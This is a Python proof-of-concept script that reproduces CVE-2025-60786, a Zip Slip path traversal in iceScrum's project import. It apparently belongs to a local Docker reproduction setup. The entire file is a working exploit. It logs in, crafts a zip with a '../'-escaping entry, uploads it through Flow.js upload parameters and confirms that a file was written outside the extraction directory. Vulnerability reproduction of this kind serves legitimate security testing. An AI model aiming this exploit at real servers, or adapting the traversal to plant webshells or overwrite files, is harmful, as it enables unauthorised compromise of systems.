import requests
import zipfile
import io
import os
import subprocess
import time

# Configuration
BASE_URL = "http://localhost:8080/icescrum"
USERNAME = "admin"
PASSWORD = "Admin123!"
LOGIN_URL = f"{BASE_URL}/j_spring_security_check"
IMPORT_URL = f"{BASE_URL}/project/import"
CONTAINER_NAME = "cve-2025-60786-icescrum-1"
TEST_FILE_PATH = "/tmp/pwned_cve_2025_60786"

def create_malicious_zip():
    print("[*] Creating malicious zip file...")
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
        # Zip Slip payload
        # Escape from the temp directory to /tmp
        # The extraction path depends on where the temp dir is. 
        # Usually /tmp/icescrum-import-...
        # So ../../../../../../../tmp/pwned should work
        path = "../" * 10 + "tmp/pwned_cve_2025_60786"
        zip_file.writestr(path, "pwned by CVE-2025-60786")
    
    return zip_buffer.getvalue()

def login(session):
    print("[*] Logging in...")
    data = {
        "j_username": USERNAME,
        "j_password": PASSWORD,
        "submit": "Login"
    }
    try:
        response = session.post(LOGIN_URL, data=data, allow_redirects=False)
        if response.status_code == 302 and "authfail" not in response.headers.get("Location", ""):
            print("[+] Login successful.")
            return True
        else:
            print(f"[-] Login failed. Status: {response.status_code}, Location: {response.headers.get('Location')}")
            return False
    except Exception as e:
        print(f"[-] Login exception: {e}")
        return False

def upload_zip(session, zip_content):
    print("[*] Uploading malicious zip...")
    
    # Mimic Flow.js parameters
    files = {
        'file': ('malicious.zip', zip_content, 'application/zip')
    }
    data = {
        'flowChunkNumber': '1',
        'flowChunkSize': '104857600',
        'flowCurrentChunkSize': str(len(zip_content)),
        'flowTotalSize': str(len(zip_content)),
        'flowIdentifier': '123456-maliciouszip',
        'flowFilename': 'malicious.zip',
        'flowRelativePath': 'malicious.zip',
        'flowTotalChunks': '1'
    }
    
    try:
        # The controller checks params.flowFilename and calls UtilsWebComponents.handleUpload
        response = session.post(IMPORT_URL, files=files, data=data)
        print(f"[*] Upload response status: {response.status_code}")
        # It might return 200 even if it fails to process, or 500 if unzip fails mid-way
        # But for Zip Slip, the extraction happens before validation often
        return True
    except Exception as e:
        print(f"[-] Upload exception: {e}")
        return False

def check_exploitation():
    print("[*] Checking if file exists in container...")
    try:
        # Check if file exists in the container
        cmd = f"docker exec {CONTAINER_NAME} ls {TEST_FILE_PATH}"
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if result.returncode == 0:
            print(f"[+] File found: {TEST_FILE_PATH}")
            print(f"[+] POC Successful! CVE-2025-60786 reproduced.")
            return True
        else:
            print(f"[-] File not found. Return code: {result.returncode}")
            return False
    except Exception as e:
        print(f"[-] Check exception: {e}")
        return False

def main():
    session = requests.Session()
    
    if not login(session):
        exit(1)
    
    zip_content = create_malicious_zip()
    
    if upload_zip(session, zip_content):
        # Give it a moment to extract
        time.sleep(2)
        if check_exploitation():
            with open("result.log", "w") as f:
                f.write("POC Successful: File written to /tmp/pwned_cve_2025_60786 via Zip Slip")
        else:
            print("[-] Exploitation failed.")
            with open("result.log", "w") as f:
                f.write("POC Failed: File not found")
            exit(1)
    else:
        print("[-] Upload step failed.")
        exit(1)

if __name__ == "__main__":
    main()
